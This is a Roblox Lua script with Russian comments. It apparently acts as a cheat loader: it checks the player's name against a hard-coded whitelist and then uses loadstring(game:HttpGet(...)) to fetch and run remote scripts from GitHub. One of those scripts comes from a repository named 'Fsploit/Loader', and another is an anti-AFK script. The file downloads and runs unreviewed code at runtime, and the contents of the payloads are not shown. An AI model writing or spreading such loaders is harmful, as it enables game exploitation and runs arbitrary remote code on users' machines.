wait(0.4)
local Player = game.Players.LocalPlayer

-- Список разрешенных пользователей (замените на нужные имена)
local allowedUsers = {
    ["Bluecoolboyto"] = true,  -- Замените на реальные имена пользователей
    ["pp27bnbesik7lape043g"] = true,
    ["makcnmfrsot34"] = true
}

-- Функция для загрузки скрипта
local function loadScript(scriptName)
    local scriptPath = "Path/To/Scripts/" .. scriptName  -- Замените на реальный путь
    local script = game:GetService("ReplicatedStorage"):FindFirstChild(scriptPath)
    if script then
        local clonedScript = script:Clone()
        clonedScript.Parent = Player.PlayerScripts
        clonedScript.Disabled = false
    else
        warn("Скрипт не найден: " .. scriptName)
    end
end

-- Проверка пользователя и загрузка соответствующего скрипта
if allowedUsers[Player.Name] then
    -- Для разрешенных пользователей
    loadstring(game:HttpGet("https://raw.githubusercontent.com/megumin2d/test/refs/heads/main/reaoikrceanorecanlkojc.lua", true))()
    wait(0.1)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KazeOnTop/Rice-Anti-Afk/main/Wind", true))()
    wait(0.2)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Fsploit/Loader/refs/heads/main/loaders-v3", true))()
    print("все удачно не твинк")
else
    -- Для всех остальных
    loadstring(game:HttpGet("https://raw.githubusercontent.com/megumin2d/test/refs/heads/main/testtesttest.lua", true))()
    wait(0.2)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KazeOnTop/Rice-Anti-Afk/main/Wind", true))()
	print("все удачн твинк")
end
